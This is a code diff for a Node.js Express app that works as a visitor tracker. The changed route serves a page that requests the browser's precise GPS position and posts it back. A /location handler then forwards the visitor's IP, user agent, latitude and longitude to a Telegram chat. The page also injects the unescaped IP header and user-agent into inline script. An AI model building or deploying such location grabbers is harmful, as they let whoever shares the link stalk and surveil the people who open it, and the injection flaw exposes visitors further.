@@ -13,29 +13,59 @@ const sendToTelegram = (message) => {
   }).catch(err => console.error('Error sending message:', err));
 };
 
-app.get('/', async (req, res) => {
+app.use(express.json());
+
+app.get('/', (req, res) => {
   let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   let userAgent = req.headers['user-agent'];
 
-  // Get geolocation using IP
-  try {
-    const response = await axios.get(`http://ip-api.com/json/${ip}`);
-    const location = response.data;
-    sendToTelegram(`
-      New Visitor:
-      IP: ${ip}
-      User Agent: ${userAgent}
-      Country: ${location.country}
-      Region: ${location.regionName}
-      City: ${location.city}
-      Lat: ${location.lat}
-      Lon: ${location.lon}
-    `);
-  } catch (err) {
-    console.error('Error fetching location:', err);
-  }
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Live Location</title>
+      <script>
+        function sendLocation(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          fetch('/location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ lat, lon, ip: '${ip}', userAgent: '${userAgent}' }),
+          });
+        }
 
-  res.send('<h1>Welcome</h1>');
+        function getLocation() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation);
+          } else {
+            alert("Geolocation is not supported by this browser.");
+          }
+        }
+
+        window.onload = getLocation;
+      </script>
+    </head>
+    <body>
+      <h1>Fetching your live location...</h1>
+    </body>
+    </html>
+  `);
+});
+
+app.post('/location', (req, res) => {
+  const { lat, lon, ip, userAgent } = req.body;
+  sendToTelegram(`
+    New Visitor:
+    IP: ${ip}
+    User Agent: ${userAgent}
+    Live Location:
+    Lat: ${lat}
+    Lon: ${lon}
+  `);
+  res.sendStatus(200);
 });
 
 module.exports = app;
